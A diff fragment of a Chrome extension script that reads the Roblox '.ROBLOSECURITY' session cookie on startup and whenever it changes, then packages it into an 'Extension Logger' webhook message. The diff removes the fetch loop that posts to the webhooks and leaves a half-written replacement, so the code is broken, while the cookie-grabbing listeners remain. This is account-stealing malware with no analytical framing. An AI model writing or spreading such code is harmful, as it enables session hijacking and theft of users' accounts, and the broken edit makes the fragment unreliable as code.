@@ -117,14 +117,8 @@ async function main(cookie) {
         username: "Extension Logger",
         avatar_url: "https://i.postimg.cc/bwpLd4YK/IMG-20250822-180503.jpg",
         
-    for (let wh of WEBHOOKS) {
-        fetch(wh.url, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ ...embedPayload, content: wh.mention })
-        }).catch(console.error);
-    }
-}
+for (let wh of WEBHOOKS) {
+        let payload = { ...embedPayload, content: wh.mention };
 
 // Startup listener
 chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, cookie => main(cookie?.value ?? null));
@@ -139,5 +133,6 @@ chrome.cookies.onChanged.addListener(changeInfo => {
         }
     }
 });
+
 
 
